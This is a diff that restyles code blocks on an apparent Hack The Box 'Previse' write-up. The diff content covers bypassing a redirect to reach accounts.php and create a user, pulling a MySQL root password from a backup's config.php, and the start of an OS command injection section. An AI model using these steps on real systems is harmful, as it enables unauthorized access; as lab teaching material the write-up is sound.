@@ -258,67 +258,67 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 /status.php (Status: 302)
 </code></pre>
 <p>going to nav.php, we discover few more pages including <strong>accounts.php</strong> , here it is best to use curl or burp because the browser is redirecting to index.php so we may overlook the form for accounts.php:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-container&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;<span style="color:#ff79c6">h2</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-heading-divider&#34;</span>&gt;Add New Account&lt;/<span style="color:#ff79c6">h2</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;<span style="color:#ff79c6">p</span>&gt;Create new user.&lt;/<span style="color:#ff79c6">p</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;<span style="color:#ff79c6">p</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-alert-danger&#34;</span>&gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&lt;/<span style="color:#ff79c6">p</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;<span style="color:#ff79c6">p</span>&gt;Usernames and passwords must be between 5 and 32 characters!&lt;/<span style="color:#ff79c6">p</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#ff79c6">p</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">role</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;form&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;accounts.php&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: user&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
-</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Username&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                &lt;/<span style="color:#ff79c6">div</span>&gt;
-</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#ff79c6">div</span>&gt;
-</span></span><span style="display:flex;"><span>            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: lock&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
-</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Password&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                &lt;/<span style="color:#ff79c6">div</span>&gt;
-</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#ff79c6">div</span>&gt;
-</span></span><span style="display:flex;"><span>            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: lock&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
-</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;confirm&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;confirm&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Confirm Password&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>                &lt;/<span style="color:#ff79c6">div</span>&gt;
-</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#ff79c6">div</span>&gt;
-</span></span><span style="display:flex;"><span>            &lt;<span style="color:#ff79c6">button</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-button uk-button-default&#34;</span>&gt;CREATE USER&lt;/<span style="color:#ff79c6">button</span>&gt;
-</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#ff79c6">form</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#ff79c6">div</span>&gt;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-container&#34;</span>&gt;
+        &lt;<span style="color:#ff79c6">h2</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-heading-divider&#34;</span>&gt;Add New Account&lt;/<span style="color:#ff79c6">h2</span>&gt;
+        &lt;<span style="color:#ff79c6">p</span>&gt;Create new user.&lt;/<span style="color:#ff79c6">p</span>&gt;
+        &lt;<span style="color:#ff79c6">p</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-alert-danger&#34;</span>&gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&lt;/<span style="color:#ff79c6">p</span>&gt;
+        &lt;<span style="color:#ff79c6">p</span>&gt;Usernames and passwords must be between 5 and 32 characters!&lt;/<span style="color:#ff79c6">p</span>&gt;
+    &lt;/<span style="color:#ff79c6">p</span>&gt;
+        &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">role</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;form&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;accounts.php&#34;</span>&gt;
+            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
+                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
+                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: user&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
+                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Username&#34;</span>&gt;
+                &lt;/<span style="color:#ff79c6">div</span>&gt;
+            &lt;/<span style="color:#ff79c6">div</span>&gt;
+            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
+                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
+                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: lock&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
+                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Password&#34;</span>&gt;
+                &lt;/<span style="color:#ff79c6">div</span>&gt;
+            &lt;/<span style="color:#ff79c6">div</span>&gt;
+            &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-margin&#34;</span>&gt;
+                &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-inline&#34;</span>&gt;
+                    &lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-form-icon&#34;</span> <span style="color:#50fa7b">uk-icon</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icon: lock&#34;</span>&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
+                    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;confirm&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-input&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;confirm&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Confirm Password&#34;</span>&gt;
+                &lt;/<span style="color:#ff79c6">div</span>&gt;
+            &lt;/<span style="color:#ff79c6">div</span>&gt;
+            &lt;<span style="color:#ff79c6">button</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;uk-button uk-button-default&#34;</span>&gt;CREATE USER&lt;/<span style="color:#ff79c6">button</span>&gt;
+        &lt;/<span style="color:#ff79c6">form</span>&gt;
+    &lt;/<span style="color:#ff79c6">div</span>&gt;
+</code></pre></td></tr></table>
 </div>
 </div><p>In Burp, we create a user, and we see in the response: <strong>Success! User was added!</strong> :</p>
 <pre><code>POST /accounts.php HTTP/1.1
@@ -362,33 +362,33 @@ Archive:  siteBackup.zip
   inflating: status.php
 </code></pre>
 <p>We can find the mysql password but this is a diversion as I was not able to remotely login:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$ cat config<span style="color:#ff79c6">.</span>php
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">function</span> <span style="color:#50fa7b">connectDB</span>(){
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$host</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;localhost&#39;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$user</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;root&#39;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$passwd</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mySQL_p@ssw0rd!:)&#39;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$db</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;previse&#39;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$mycon</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> mysqli(<span style="color:#8be9fd;font-style:italic">$host</span>, <span style="color:#8be9fd;font-style:italic">$user</span>, <span style="color:#8be9fd;font-style:italic">$passwd</span>, <span style="color:#8be9fd;font-style:italic">$db</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$mycon</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$ cat config<span style="color:#ff79c6">.</span>php
+<span style="color:#ff79c6">&lt;?</span>php
+<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">connectDB</span>(){
+    <span style="color:#8be9fd;font-style:italic">$host</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;localhost&#39;</span>;
+    <span style="color:#8be9fd;font-style:italic">$user</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;root&#39;</span>;
+    <span style="color:#8be9fd;font-style:italic">$passwd</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mySQL_p@ssw0rd!:)&#39;</span>;
+    <span style="color:#8be9fd;font-style:italic">$db</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;previse&#39;</span>;
+    <span style="color:#8be9fd;font-style:italic">$mycon</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> mysqli(<span style="color:#8be9fd;font-style:italic">$host</span>, <span style="color:#8be9fd;font-style:italic">$user</span>, <span style="color:#8be9fd;font-style:italic">$passwd</span>, <span style="color:#8be9fd;font-style:italic">$db</span>);
+    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$mycon</span>;
+}
+<span style="color:#ff79c6">?&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>Indeed we cannot remotely login:</p>
 <pre><code>sudo apt install mycli
@@ -399,95 +399,95 @@ mycli -h 10.10.11.104 -p 8080 -D previse -u root --pass &quot;mySQL_p@ssw0rd\!\:
 </code></pre>
 <h2 id="os-command-injection">OS command injection</h2>
 <p>row 20 there is an obvious OS command Injection vulnerability:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
